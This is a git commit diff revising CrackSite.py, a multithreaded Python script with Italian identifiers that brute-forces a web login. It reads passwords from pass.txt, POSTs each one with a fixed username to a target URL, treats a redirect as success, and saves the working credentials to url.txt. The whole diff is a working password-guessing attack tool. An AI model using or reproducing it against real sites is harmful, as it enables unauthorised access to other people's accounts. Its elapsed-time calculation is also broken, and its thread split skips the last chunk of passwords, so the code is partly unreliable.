2eb907c47b3fdae78e43d77547abbb90a11f1522
Bosticardo-Andrea <90908021+Bosticardo-Andrea@users.noreply.github.com>
2023-03-20 14:02:39 +0100

    Add files via upload

--- CrackSite.py
+++ CrackSite.py
@@ -1,37 +1,33 @@
-import requests,os,sys,time
+import requests,os,sys,time,datetime
 from threading import Thread
 listT = []
 class MyThread(Thread):
-    def __init__(self,url,stringa,complete):
+    def __init__(self,url,stringa):
         Thread.__init__(self)
         self.stringa = stringa
         self.url = url
         self.ferma = False
-        self.complete = complete
     def run(self):
-        while not self.ferma:
-            payload = {"username": "","password" : ""}
-            for x in self.stringa:
-                for y in self.complete:
-                    payload["password"] = y.strip()
-                    payload["username"] = x.strip()
-                    print(x.strip(),y.strip())
-                    r = requests.post(self.url,data=payload)
-                    if str(r.url) != self.url:
-                        os.system("cls")
-                        f = open("url.txt","w")
-                        print(f"user --> {payload['username']}\npassword --> {payload['password']}\nurl --> {r.url}",file=f)
-                        self.ferma=True
-                        f.close()
-                        r.close()
-                        self.stop()
-                    payload["password"] = []
-                    r.close()
+        payload = {"username": "000","password" : ""}
+        for x in self.stringa:
+            if not self.ferma:
+                payload["password"] = x.strip()
+                print(x.strip())
+                r = requests.post(self.url,data=payload)
+                if str(r.url) != self.url:
+                    os.system("cls")
+                    f = open("url.txt","w")
+                    print(f"user --> {payload['username']}\npassword --> {payload['password']}\nurl --> {r.url}",file=f)
+                    f.close()
+                    self.stop()
+                    break
+                payload["password"] = []
     def stop(self):
         self.ferma = True
         print("mi fermo")
         
 def main():
+    inizio = datetime.datetime.now().microsecond
     f = open("pass.txt","r")
     stringa = f.readlines()
     f.close()
@@ -42,19 +38,22 @@ def main():
     time.sleep(2)  
     os.system("cls")
     try:
-        for i in range(numT):
-                listT.append(MyThread(url,stringa[int(i*lung):int(lung*i+lung)].copy(),stringa.copy()))
+        for i in range(numT-1):
+                listT.append(MyThread(url,stringa[int(i*lung):int(lung*i+lung)].copy()))
                 listT[-1].start()
         ok = True
         while ok:
             for x in listT:
                 if x.ferma: 
-                    for cella in listT.copy():
+                    for cella in listT:
                         cella.stop()
                         cella.join()
                         ok = False
-        sys.exit()
+                    break
     except Exception as e:
         print(f"Errore:\n{e}\n")
+    finally:
+        fine = datetime.datetime.now().microsecond
+        print(f"Tempo trascorso: {(inizio-fine)/1000}")
         
 if __name__=="__main__":main()
